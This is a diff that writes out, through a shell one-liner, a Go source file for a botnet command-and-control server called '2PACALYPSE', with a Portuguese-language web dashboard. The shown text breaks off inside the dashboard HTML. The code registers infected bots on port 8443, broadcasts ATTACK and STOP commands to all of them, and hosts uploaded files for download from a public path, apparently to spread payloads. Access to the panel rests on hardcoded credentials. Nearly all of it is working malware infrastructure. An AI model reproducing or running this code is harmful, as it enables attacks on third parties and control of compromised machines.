@@ -1,0 +1,878 @@
+pkill -f meu_servidor 2>/dev/null; pkill -f server.go 2>/dev/null; sleep 1 && cd ~ && rm -f server.go meu_servidor log.txt && mkdir -p uploads && cat > server.go << 'ENDOFFILE'
+package main
+
+import (
+	"bufio"
+	"crypto/rand"
+	"encoding/hex"
+	"fmt"
+	"io"
+	"net"
+	"net/http"
+	"os"
+	"path/filepath"
+	"runtime"
+	"strconv"
+	"strings"
+	"sync"
+	"syscall"
+	"time"
+)
+
+const (
+	USUARIO    = "soosudsabe"
+	SENHA      = "2pacalypse"
+	WEB_PORTA  = ":1337"
+	BOT_PORTA  = ":8443"
+	UPLOAD_DIR = "uploads"
+)
+
+var startTime = time.Now()
+
+type UploadedFile struct {
+	Name       string
+	Size       int64
+	UploadedAt time.Time
+	ID         string
+}
+
+type Bot struct {
+	ID          int
+	Conn        net.Conn
+	IP          string
+	Arch        string
+	OS          string
+	LocalIP     string
+	ConnectedAt time.Time
+	Attacking   bool
+	LastPing    time.Time
+	mu          sync.Mutex
+}
+
+type BotManager struct {
+	bots   map[int]*Bot
+	nextID int
+	mu     sync.RWMutex
+}
+
+var manager = &BotManager{bots: make(map[int]*Bot), nextID: 1}
+var uploadedFiles []UploadedFile
+var uploadMu sync.RWMutex
+
+func randID() string {
+	b := make([]byte, 8)
+	rand.Read(b)
+	return hex.EncodeToString(b)
+}
+
+func loadExistingFiles() {
+	entries, err := os.ReadDir(UPLOAD_DIR)
+	if err != nil {
+		return
+	}
+	for _, e := range entries {
+		if e.IsDir() {
+			continue
+		}
+		name := e.Name()
+		idx := strings.Index(name, "_")
+		if idx < 1 {
+			continue
+		}
+		fid := name[:idx]
+		origName := name[idx+1:]
+		info, err := e.Info()
+		if err != nil {
+			continue
+		}
+		uf := UploadedFile{
+			Name:       origName,
+			Size:       info.Size(),
+			UploadedAt: info.ModTime(),
+			ID:         fid,
+		}
+		uploadedFiles = append(uploadedFiles, uf)
+	}
+	if len(uploadedFiles) > 0 {
+		fmt.Printf("[*] %d arquivo(s) carregado(s) da pasta uploads\n", len(uploadedFiles))
+	}
+}
+
+func (m *BotManager) AddBot(conn net.Conn, arch, osinfo, localIP string) *Bot {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	ip := conn.RemoteAddr().String()
+	host, _, _ := net.SplitHostPort(ip)
+	bot := &Bot{ID: m.nextID, Conn: conn, IP: host, Arch: arch, OS: osinfo, LocalIP: localIP, ConnectedAt: time.Now(), LastPing: time.Now()}
+	m.bots[m.nextID] = bot
+	m.nextID++
+	fmt.Printf("[+] Bot #%d conectado: %s [%s] (%s)\n", bot.ID, host, arch, osinfo)
+	return bot
+}
+
+func (m *BotManager) RemoveBot(id int) {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	if bot, ok := m.bots[id]; ok {
+		fmt.Printf("[-] Bot #%d desconectado: %s [%s]\n", bot.ID, bot.IP, bot.Arch)
+		bot.Conn.Close()
+		delete(m.bots, id)
+	}
+}
+
+func (m *BotManager) GetBots() []*Bot {
+	m.mu.RLock()
+	defer m.mu.RUnlock()
+	bots := make([]*Bot, 0, len(m.bots))
+	for _, b := range m.bots {
+		bots = append(bots, b)
+	}
+	return bots
+}
+
+func (m *BotManager) GetBotCount() int {
+	m.mu.RLock()
+	defer m.mu.RUnlock()
+	return len(m.bots)
+}
+
+func (m *BotManager) SendToAll(cmd string) int {
+	m.mu.RLock()
+	defer m.mu.RUnlock()
+	sent := 0
+	for _, bot := range m.bots {
+		bot.mu.Lock()
+		_, err := fmt.Fprintf(bot.Conn, "%s\n", cmd)
+		bot.mu.Unlock()
+		if err == nil {
+			sent++
+		}
+	}
+	fmt.Printf("[*] Comando enviado para %d/%d bots: %s\n", sent, len(m.bots), cmd)
+	return sent
+}
+
+func (m *BotManager) SendToBot(id int, cmd string) bool {
+	m.mu.RLock()
+	bot, ok := m.bots[id]
+	m.mu.RUnlock()
+	if !ok {
+		return false
+	}
+	bot.mu.Lock()
+	_, err := fmt.Fprintf(bot.Conn, "%s\n", cmd)
+	bot.mu.Unlock()
+	return err == nil
+}
+
+func handleBot(conn net.Conn) {
+	if tc, ok := conn.(*net.TCPConn); ok {
+		tc.SetKeepAlive(true)
+		tc.SetKeepAlivePeriod(30 * time.Second)
+	}
+	scanner := bufio.NewScanner(conn)
+	scanner.Buffer(make([]byte, 8192), 8192)
+	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
+	if !scanner.Scan() {
+		conn.Close()
+		return
+	}
+	hello := scanner.Text()
+	parts := strings.SplitN(hello, "|", 4)
+	if len(parts) < 2 || parts[0] != "HELLO" {
+		conn.Close()
+		return
+	}
+	arch := "unknown"
+	osinfo := "unknown"
+	localIP := "unknown"
+	if len(parts) >= 2 {
+		arch = parts[1]
+	}
+	if len(parts) >= 3 {
+		osinfo = parts[2]
+	}
+	if len(parts) >= 4 {
+		localIP = parts[3]
+	}
+	bot := manager.AddBot(conn, arch, osinfo, localIP)
+	defer manager.RemoveBot(bot.ID)
+	bot.mu.Lock()
+	fmt.Fprintf(bot.Conn, "PING\n")
+	bot.mu.Unlock()
+	go func() {
+		ticker := time.NewTicker(30 * time.Second)
+		defer ticker.Stop()
+		for {
+			<-ticker.C
+			bot.mu.Lock()
+			_, err := fmt.Fprintf(bot.Conn, "PING\n")
+			bot.mu.Unlock()
+			if err != nil {
+				return
+			}
+		}
+	}()
+	for {
+		conn.SetReadDeadline(time.Now().Add(120 * time.Second))
+		if !scanner.Scan() {
+			break
+		}
+		line := scanner.Text()
+		if strings.HasPrefix(line, "PONG|") {
+			pp := strings.SplitN(line, "|", 3)
+			if len(pp) >= 3 {
+				bot.mu.Lock()
+				bot.Attacking = pp[2] == "1"
+				bot.LastPing = time.Now()
+				bot.mu.Unlock()
+			}
+			continue
+		}
+		if strings.HasPrefix(line, "STATUS|") {
+			st := strings.TrimPrefix(line, "STATUS|")
+			bot.mu.Lock()
+			bot.Attacking = (st == "attacking")
+			bot.mu.Unlock()
+			fmt.Printf("[*] Bot #%d (%s) status: %s\n", bot.ID, bot.IP, st)
+			continue
+		}
+	}
+}
+
+func botListener() {
+	ln, err := net.Listen("tcp", BOT_PORTA)
+	if err != nil {
+		fmt.Printf("[ERRO] Nao foi possivel abrir porta bot %s: %v\n", BOT_PORTA, err)
+		return
+	}
+	fmt.Printf("[*] Bot Listener ativo na porta %s\n", BOT_PORTA)
+	for {
+		conn, err := ln.Accept()
+		if err != nil {
+			continue
+		}
+		go handleBot(conn)
+	}
+}
+
+func uploadHandler(w http.ResponseWriter, r *http.Request) {
+	if r.Method != "POST" {
+		http.Error(w, "Method not allowed", 405)
+		return
+	}
+	r.ParseMultipartForm(100 << 20)
+	file, header, err := r.FormFile("file")
+	if err != nil {
+		w.Header().Set("Content-Type", "application/json")
+		fmt.Fprintf(w, `{"status":"error","message":"Erro no upload: %s"}`, err.Error())
+		return
+	}
+	defer file.Close()
+	fid := randID()
+	safeName := filepath.Base(header.Filename)
+	dstPath := filepath.Join(UPLOAD_DIR, fid+"_"+safeName)
+	dst, err := os.Create(dstPath)
+	if err != nil {
+		w.Header().Set("Content-Type", "application/json")
+		fmt.Fprintf(w, `{"status":"error","message":"Erro ao salvar arquivo"}`)
+		return
+	}
+	defer dst.Close()
+	written, _ := io.Copy(dst, file)
+	uf := UploadedFile{Name: safeName, Size: written, UploadedAt: time.Now(), ID: fid}
+	uploadMu.Lock()
+	uploadedFiles = append(uploadedFiles, uf)
+	uploadMu.Unlock()
+	w.Header().Set("Content-Type", "application/json")
+	fmt.Fprintf(w, `{"status":"ok","id":"%s","name":"%s","size":%d}`, fid, safeName, written)
+}
+
+func deleteFileHandler(w http.ResponseWriter, r *http.Request) {
+	if r.Method != "POST" {
+		http.Error(w, "Method not allowed", 405)
+		return
+	}
+	r.ParseForm()
+	fid := r.FormValue("id")
+	if fid == "" {
+		http.Error(w, "Missing id", 400)
+		return
+	}
+	uploadMu.Lock()
+	idx := -1
+	for i, f := range uploadedFiles {
+		if f.ID == fid {
+			idx = i
+			break
+		}
+	}
+	if idx >= 0 {
+		fname := uploadedFiles[idx].Name
+		os.Remove(filepath.Join(UPLOAD_DIR, fid+"_"+fname))
+		uploadedFiles = append(uploadedFiles[:idx], uploadedFiles[idx+1:]...)
+	}
+	uploadMu.Unlock()
+	w.Header().Set("Content-Type", "application/json")
+	fmt.Fprintf(w, `{"status":"ok"}`)
+}
+
+func filesAPIHandler(w http.ResponseWriter, r *http.Request) {
+	uploadMu.RLock()
+	defer uploadMu.RUnlock()
+	w.Header().Set("Content-Type", "application/json")
+	host := r.Host
+	proto := "http"
+	fmt.Fprintf(w, `{"files":[`)
+	for i, f := range uploadedFiles {
+		url := fmt.Sprintf("%s://%s/dl/%s/%s", proto, host, f.ID, f.Name)
+		ago := time.Since(f.UploadedAt).Seconds()
+		fmt.Fprintf(w, `{"id":"%s","name":"%s","size":%d,"ago":%.0f,"url":"%s"}`, f.ID, f.Name, f.Size, ago, url)
+		if i < len(uploadedFiles)-1 {
+			fmt.Fprint(w, ",")
+		}
+	}
+	fmt.Fprint(w, `]}`)
+}
+
+func downloadHandler(w http.ResponseWriter, r *http.Request) {
+	path := strings.TrimPrefix(r.URL.Path, "/dl/")
+	parts := strings.SplitN(path, "/", 2)
+	if len(parts) < 2 {
+		http.Error(w, "Not found", 404)
+		return
+	}
+	fid := parts[0]
+	fname := parts[1]
+	fpath := filepath.Join(UPLOAD_DIR, fid+"_"+fname)
+	if _, err := os.Stat(fpath); os.IsNotExist(err) {
+		http.Error(w, "Not found", 404)
+		return
+	}
+	w.Header().Set("Content-Disposition", "attachment; filename="+fname)
+	w.Header().Set("Content-Type", "application/octet-stream")
+	http.ServeFile(w, r, fpath)
+}
+
+func main() {
+	os.MkdirAll(UPLOAD_DIR, 0755)
+	loadExistingFiles()
+	go botListener()
+	http.HandleFunc("/", authMiddleware(homeHandler))
+	http.HandleFunc("/dashboard", authMiddleware(dashboardHandler))
+	http.HandleFunc("/api/attack", authMiddleware(attackHandler))
+	http.HandleFunc("/api/stop", authMiddleware(stopHandler))
+	http.HandleFunc("/api/bots", authMiddleware(botsAPIHandler))
+	http.HandleFunc("/api/upload", authMiddleware(uploadHandler))
+	http.HandleFunc("/api/files", authMiddleware(filesAPIHandler))
+	http.HandleFunc("/api/delete-file", authMiddleware(deleteFileHandler))
+	http.HandleFunc("/api/stats", authMiddleware(statsAPIHandler))
+	http.HandleFunc("/dl/", downloadHandler)
+	http.HandleFunc("/logout", logoutHandler)
+	fmt.Println("================================================")
+	fmt.Println("         2PACALYPSE V2026 - Sistema Ativo")
+	fmt.Println("================================================")
+	fmt.Printf("[*] Web Porta: %s\n", WEB_PORTA)
+	fmt.Printf("[*] Bot Porta: %s\n", BOT_PORTA)
+	fmt.Println("[*] Status: ONLINE")
+	fmt.Println("================================================")
+	http.ListenAndServe(WEB_PORTA, nil)
+}
+
+func getCPUPercent() float64 {
+	data, err := os.ReadFile("/proc/self/stat")
+	if err != nil {
+		return 0
+	}
+	fields := strings.Fields(string(data))
+	if len(fields) < 15 {
+		return 0
+	}
+	utime, _ := strconv.ParseFloat(fields[13], 64)
+	stime, _ := strconv.ParseFloat(fields[14], 64)
+	total := utime + stime
+	clkTck := 100.0
+	upSec := time.Since(startTime).Seconds()
+	if upSec < 1 {
+		return 0
+	}
+	pct := (total / clkTck / upSec) * 100.0
+	if pct > 100 {
+		pct = 100
+	}
+	return pct
+}
+
+func getMemInfo() (uint64, uint64) {
+	var ms runtime.MemStats
+	runtime.ReadMemStats(&ms)
+	alloc := ms.Alloc
+	var rusage syscall.Rusage
+	syscall.Getrusage(syscall.RUSAGE_SELF, &rusage)
+	rss := uint64(rusage.Maxrss) * 1024
+	if rss < alloc {
+		rss = ms.Sys
+	}
+	return rss, alloc
+}
+
+func statsAPIHandler(w http.ResponseWriter, r *http.Request) {
+	uptime := int(time.Since(startTime).Seconds())
+	cpu := getCPUPercent()
+	rss, alloc := getMemInfo()
+	w.Header().Set("Content-Type", "application/json")
+	fmt.Fprintf(w, `{"uptime":%d,"bots":%d,"cpu":%.1f,"rss":%d,"alloc":%d}`, uptime, manager.GetBotCount(), cpu, rss, alloc)
+}
+
+func authMiddleware(next http.HandlerFunc) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		cookie, err := r.Cookie("auth_session")
+		if err != nil || cookie.Value != "authenticated" {
+			loginHandler(w, r)
+			return
+		}
+		next(w, r)
+	}
+}
+
+func loginHandler(w http.ResponseWriter, r *http.Request) {
+	errorMsg := ""
+	if r.Method == "POST" {
+		r.ParseForm()
+		if r.FormValue("user") == USUARIO && r.FormValue("pass") == SENHA {
+			http.SetCookie(w, &http.Cookie{Name: "auth_session", Value: "authenticated", Path: "/", MaxAge: 3600})
+			http.Redirect(w, r, "/dashboard", http.StatusFound)
+			return
+		}
+		errorMsg = `<div class="error-alert">Credenciais invalidas</div>`
+	}
+	w.Header().Set("Content-Type", "text/html; charset=utf-8")
+	fmt.Fprintf(w, loginHTML(), errorMsg)
+}
+
+func homeHandler(w http.ResponseWriter, r *http.Request) {
+	http.Redirect(w, r, "/dashboard", http.StatusFound)
+}
+
+func attackHandler(w http.ResponseWriter, r *http.Request) {
+	if r.Method != "POST" {
+		http.Error(w, "Method not allowed", 405)
+		return
+	}
+	r.ParseForm()
+	cmd := r.FormValue("command")
+	if cmd == "" {
+		http.Error(w, "Comando vazio", 400)
+		return
+	}
+	fullCmd := "ATTACK|" + cmd
+	sent := manager.SendToAll(fullCmd)
+	w.Header().Set("Content-Type", "application/json")
+	fmt.Fprintf(w, `{"status":"ok","sent":%d,"total":%d,"command":"%s"}`, sent, manager.GetBotCount(), cmd)
+}
+
+func stopHandler(w http.ResponseWriter, r *http.Request) {
+	if r.Method != "POST" {
+		http.Error(w, "Method not allowed", 405)
+		return
+	}
+	sent := manager.SendToAll("STOP")
+	w.Header().Set("Content-Type", "application/json")
+	fmt.Fprintf(w, `{"status":"ok","sent":%d,"total":%d}`, sent, manager.GetBotCount())
+}
+
+func botsAPIHandler(w http.ResponseWriter, r *http.Request) {
+	bots := manager.GetBots()
+	w.Header().Set("Content-Type", "application/json")
+	fmt.Fprintf(w, `{"count":%d,"bots":[`, len(bots))
+	for i, b := range bots {
+		b.mu.Lock()
+		uptimeSec := int(time.Since(b.ConnectedAt).Seconds())
+		status := "idle"
+		if b.Attacking {
+			status = "attacking"
+		}
+		lastPingSec := int(time.Since(b.LastPing).Seconds())
+		fmt.Fprintf(w, `{"id":%d,"ip":"%s","arch":"%s","os":"%s","local_ip":"%s","uptime":%d,"status":"%s","last_ping":%d}`,
+			b.ID, b.IP, b.Arch, b.OS, b.LocalIP, uptimeSec, status, lastPingSec)
+		b.mu.Unlock()
+		if i < len(bots)-1 {
+			fmt.Fprint(w, ",")
+		}
+	}
+	fmt.Fprint(w, `]}`)
+}
+
+func dashboardHandler(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "text/html; charset=utf-8")
+	fmt.Fprintf(w, dashboardHTML(), USUARIO)
+}
+
+func logoutHandler(w http.ResponseWriter, r *http.Request) {
+	http.SetCookie(w, &http.Cookie{Name: "auth_session", Value: "", Path: "/", MaxAge: -1})
+	http.Redirect(w, r, "/", http.StatusFound)
+}
+
+func loginHTML() string {
+	return `<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>2PACALYPSE - Login</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Inter',sans-serif;background:#06060a;min-height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden}
+body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 20%% 0%%,rgba(124,58,237,.12) 0%%,transparent 50%%),radial-gradient(ellipse at 80%% 100%%,rgba(236,72,153,.08) 0%%,transparent 50%%);pointer-events:none}
+.box{position:relative;z-index:1;width:90%%;max-width:420px;background:rgba(12,12,20,.7);border:1px solid rgba(255,255,255,.05);border-radius:24px;padding:48px 40px;backdrop-filter:blur(40px);box-shadow:0 25px 80px rgba(0,0,0,.6)}
+.logo{text-align:center;margin-bottom:40px}
+.logo h1{font-size:28px;font-weight:800;letter-spacing:3px;background:linear-gradient(135deg,#a855f7,#ec4899,#f97316);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.logo p{font-size:10px;letter-spacing:6px;color:rgba(255,255,255,.25);margin-top:6px;font-weight:600}
+.title{color:rgba(255,255,255,.85);font-size:18px;font-weight:500;text-align:center;margin-bottom:28px}
+.fg{margin-bottom:18px}
+.fg label{display:block;color:rgba(255,255,255,.45);font-size:11px;font-weight:600;letter-spacing:1px;text-transform:uppercase;margin-bottom:8px}
+.fg input{width:100%%;padding:14px 18px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:12px;color:#fff;font-size:14px;font-family:'Inter',sans-serif;outline:none;transition:.3s}
+.fg input:focus{border-color:rgba(168,85,247,.5);box-shadow:0 0 0 3px rgba(168,85,247,.1);background:rgba(255,255,255,.06)}
+.fg input::placeholder{color:rgba(255,255,255,.2)}
+.btn{width:100%%;padding:15px;background:linear-gradient(135deg,#7c3aed,#db2777);border:none;border-radius:12px;color:#fff;font-size:14px;font-weight:700;letter-spacing:.5px;cursor:pointer;transition:.3s;margin-top:24px;font-family:'Inter',sans-serif}
+.btn:hover{transform:translateY(-2px);box-shadow:0 12px 35px rgba(124,58,237,.35)}
+.error-alert{background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.25);color:#f87171;padding:12px 16px;border-radius:10px;font-size:13px;margin-bottom:20px;text-align:center}
+.foot{text-align:center;margin-top:28px;color:rgba(255,255,255,.2);font-size:11px}
+</style>
+</head>
+<body>
+<div class="box">
+<div class="logo"><h1>2PACALYPSE</h1><p>V2026</p></div>
+<h2 class="title">Acesso Restrito</h2>
+%s
+<form method="POST">
+<div class="fg"><label>Usuario</label><input type="text" name="user" placeholder="Digite seu usuario" required autocomplete="off"></div>
+<div class="fg"><label>Senha</label><input type="password" name="pass" placeholder="Digite sua senha" required></div>
+<button type="submit" class="btn">ENTRAR</button>
+</form>
+<p class="foot">Sistema protegido</p>
+</div>
+</body>
+</html>`
+}
+
+func dashboardHTML() string {
+	return `<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>2PACALYPSE - Dashboard</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#06060a;--card:rgba(12,12,22,.65);--border:rgba(255,255,255,.06);--accent1:#a855f7;--accent2:#ec4899;--green:#10b981;--red:#f43f5e;--text:rgba(255,255,255,.85);--dim:rgba(255,255,255,.4)}
+body{font-family:'Inter',sans-serif;background:var(--bg);color:#fff;min-height:100vh}
+body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 15%% 0%%,rgba(124,58,237,.1) 0%%,transparent 50%%),radial-gradient(ellipse at 85%% 100%%,rgba(236,72,153,.06) 0%%,transparent 50%%);pointer-events:none;z-index:0}
+.nav{background:rgba(8,8,14,.85);border-bottom:1px solid var(--border);backdrop-filter:blur(30px);padding:0 40px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:100;height:64px}
+.nav .logo{font-size:18px;font-weight:800;letter-spacing:2px;background:linear-gradient(135deg,var(--accent1),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.nav .ver{font-size:9px;letter-spacing:4px;color:rgba(255,255,255,.25);font-weight:600}
+.nav-tabs{display:flex;gap:4px}
+.nav-tab{background:none;border:1px solid transparent;color:var(--dim);padding:8px 20px;border-radius:8px;font-size:13px;font-weight:500;cursor:pointer;transition:.2s;font-family:'Inter',sans-serif;display:flex;align-items:center;gap:8px}
+.nav-tab:hover{color:#fff;background:rgba(255,255,255,.05)}
+.nav-tab.active{color:#fff;background:rgba(168,85,247,.15);border:1px solid rgba(168,85,247,.25)}
+.nav-tab svg{width:16px;height:16px;flex-shrink:0}
+.nav-r{display:flex;align-items:center;gap:12px}
+.logout{background:none;border:1px solid rgba(255,255,255,.08);color:rgba(255,255,255,.6);padding:8px 20px;border-radius:8px;font-size:12px;font-weight:500;cursor:pointer;transition:.2s;text-decoration:none;font-family:'Inter',sans-serif}
+.logout:hover{background:rgba(244,63,94,.1);border-color:var(--red);color:var(--red)}
+.main{max-width:1400px;margin:0 auto;padding:32px 40px;position:relative;z-index:1}
+.welcome h1{font-size:30px;font-weight:300;margin-bottom:6px}
+.welcome h1 strong{background:linear-gradient(135deg,var(--accent1),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:700}
+.welcome p{color:var(--dim);font-size:13px;margin-bottom:28px}
+.grid4{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin-bottom:28px}
+.card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:24px;backdrop-filter:blur(10px);position:relative;overflow:hidden;transition:.3s}
+.card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent1),var(--accent2));opacity:.6}
+.card:hover{transform:translateY(-3px);border-color:rgba(168,85,247,.15);box-shadow:0 16px 40px rgba(0,0,0,.3)}
+.card .lbl{color:var(--dim);font-size:10px;text-transform:uppercase;letter-spacing:1.5px;font-weight:600;margin-bottom:8px;display:flex;align-items:center;gap:6px}
+.card .lbl svg{width:14px;height:14px;opacity:.6}
+.card .val{font-size:24px;font-weight:700}
+.card .val.g{color:var(--green)}
+.status-bar{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px 24px;display:flex;align-items:center;gap:14px;backdrop-filter:blur(10px);margin-bottom:28px}
+.pulse-dot{width:10px;height:10px;background:var(--green);border-radius:50%%;animation:pulse 2s infinite}
+@keyframes pulse{0%%,100%%{box-shadow:0 0 0 0 rgba(16,185,129,.5)}50%%{box-shadow:0 0 0 10px rgba(16,185,129,0)}}
+.status-bar p{color:var(--dim);font-size:13px}
+.status-bar strong{color:var(--green)}
+.panel{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:28px;backdrop-filter:blur(10px);margin-bottom:28px}
+.panel-title{font-size:16px;font-weight:600;margin-bottom:18px;display:flex;align-items:center;gap:10px}
+.panel-title svg{width:20px;height:20px;opacity:.7}
+.tab-content{display:none}
+.tab-content.active{display:block}
+.atk-form{display:flex;gap:10px;flex-wrap:wrap}
+.atk-input{flex:1;min-width:280px;padding:13px 18px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:10px;color:#fff;font-size:13px;font-family:'JetBrains Mono',monospace;outline:none;transition:.3s}
+.atk-input:focus{border-color:rgba(168,85,247,.4);box-shadow:0 0 0 3px rgba(168,85,247,.08)}
+.atk-input::placeholder{color:rgba(255,255,255,.2)}
+.btn-p{padding:13px 28px;background:linear-gradient(135deg,#7c3aed,#db2777);border:none;border-radius:10px;color:#fff;font-size:13px;font-weight:600;cursor:pointer;transition:.25s;white-space:nowrap;font-family:'Inter',sans-serif}
+.btn-p:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(124,58,237,.3)}
+.btn-d{padding:13px 28px;background:linear-gradient(135deg,#dc2626,var(--red));border:none;border-radius:10px;color:#fff;font-size:13px;font-weight:600;cursor:pointer;transition:.25s;white-space:nowrap;font-family:'Inter',sans-serif}
+.btn-d:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(244,63,94,.3)}
+.help{color:var(--dim);font-size:11px;margin-top:14px;font-family:'JetBrains Mono',monospace;line-height:1.7}
+.msg{margin-top:12px;padding:11px 16px;border-radius:10px;font-size:12px;display:none;animation:fadeIn .3s}
+.msg.ok{display:block;background:rgba(16,185,129,.08);border:1px solid rgba(16,185,129,.25);color:#34d399}
+.msg.err{display:block;background:rgba(244,63,94,.08);border:1px solid rgba(244,63,94,.25);color:#f87171}
+@keyframes fadeIn{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}
+table{width:100%%;border-collapse:collapse;margin-top:12px}
+th{text-align:left;padding:10px 14px;color:var(--dim);font-size:10px;text-transform:uppercase;letter-spacing:1px;font-weight:600;border-bottom:1px solid var(--border)}
+td{padding:12px 14px;font-size:13px;border-bottom:1px solid rgba(255,255,255,.03);color:rgba(255,255,255,.75)}
+tr:hover td{background:rgba(168,85,247,.04)}
+.badge{display:inline-block;padding:3px 10px;border-radius:6px;font-size:11px;font-weight:600;font-family:'JetBrains Mono',monospace}
+.b-blue{background:rgba(59,130,246,.12);color:#60a5fa;border:1px solid rgba(59,130,246,.25)}
+.b-yellow{background:rgba(245,158,11,.12);color:#fbbf24;border:1px solid rgba(245,158,11,.25)}
+.b-green{background:rgba(16,185,129,.12);color:#34d399;border:1px solid rgba(16,185,129,.25)}
+.b-purple{background:rgba(168,85,247,.12);color:#c084fc;border:1px solid rgba(168,85,247,.25)}
+.b-gray{background:rgba(255,255,255,.06);color:rgba(255,255,255,.45);border:1px solid rgba(255,255,255,.12)}
+.sd{display:inline-block;width:7px;height:7px;border-radius:50%%;margin-right:7px}
+.sd-g{background:var(--green)}
+.sd-r{background:var(--red);animation:pr 1.5s infinite}
+@keyframes pr{0%%,100%%{box-shadow:0 0 0 0 rgba(244,63,94,.5)}50%%{box-shadow:0 0 0 6px rgba(244,63,94,0)}}
+.empty{text-align:center;padding:36px;color:rgba(255,255,255,.25);font-size:13px}
+.empty svg{width:40px;height:40px;margin-bottom:10px;opacity:.25}
+.upload-zone{border:2px dashed rgba(255,255,255,.1);border-radius:14px;padding:36px;text-align:center;cursor:pointer;transition:.3s;margin-bottom:20px}
+.upload-zone:hover{border-color:rgba(168,85,247,.35);background:rgba(168,85,247,.04)}
+.upload-zone.dragover{border-color:var(--accent1);background:rgba(168,85,247,.08)}
+.upload-zone svg{width:36px;height:36px;margin-bottom:10px;opacity:.4;color:var(--accent1)}
+.upload-zone p{color:var(--dim);font-size:13px}
+.upload-zone .small{font-size:11px;color:rgba(255,255,255,.2);margin-top:6px}
+.file-item{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.05);border-radius:10px;margin-bottom:8px;transition:.2s}
+.file-item:hover{border-color:rgba(168,85,247,.2);background:rgba(168,85,247,.03)}
+.file-info{display:flex;align-items:center;gap:12px}
+.file-info svg{width:20px;height:20px;opacity:.45;flex-shrink:0;color:var(--accent1)}
+.file-name{font-size:13px;font-weight:500;color:var(--text)}
+.file-size{font-size:11px;color:var(--dim)}
+.file-url{display:flex;align-items:center;gap:8px}
+.url-box{background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.06);border-radius:6px;padding:6px 12px;font-size:11px;font-family:'JetBrains Mono',monospace;color:rgba(255,255,255,.6);max-width:340px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.btn-sm{padding:6px 14px;border-radius:6px;border:none;font-size:11px;font-weight:600;cursor:pointer;transition:.2s;font-family:'Inter',sans-serif}
+.btn-copy{background:rgba(168,85,247,.15);color:var(--accent1);border:1px solid rgba(168,85,247,.25)}
+.btn-copy:hover{background:rgba(168,85,247,.25)}
+.btn-del{background:rgba(244,63,94,.1);color:var(--red);border:1px solid rgba(244,63,94,.2);margin-left:4px}
+.btn-del:hover{background:rgba(244,63,94,.2)}
+.grid6{display:grid;grid-template-columns:repeat(6,1fr);gap:16px;margin-bottom:28px}
+@media(max-width:900px){.grid6{grid-template-columns:repeat(3,1fr)}.main{padding:20px}.atk-form{flex-direction:column}.atk-input{min-width:auto}.url-box{max-width:180px}.nav{padding:0 20px}}
+@media(max-width:600px){.grid4{grid-template-columns:1fr}.nav-tabs{display:none}}
+</style>
+</head>
+<body>
+<nav class="nav">
+<div><div class="logo">2PACALYPSE</div><div class="ver">V2026</div></div>
+<div class="nav-tabs">
+<button class="nav-tab active" onclick="switchTab('attack')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>Ataque</button>
+<button class="nav-tab" onclick="switchTab('bots')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="10" rx="2"/><circle cx="12" cy="5" r="3"/><path d="M8 16h.01M16 16h.01"/></svg>Bots</button>
+<button class="nav-tab" onclick="switchTab('files')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>Uploads</button>
+</div>
+<div class="nav-r"><a href="/logout" class="logout">Sair</a></div>
+</nav>
+<div class="main">
+<div class="welcome">
+<h1>Bem-vindo, <strong>%s</strong></h1>
+<p>Painel de controle ativo</p>
+</div>
+<div class="grid6">
+<div class="card"><div class="lbl"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>Uptime</div><div class="val" id="uptime">--</div></div>
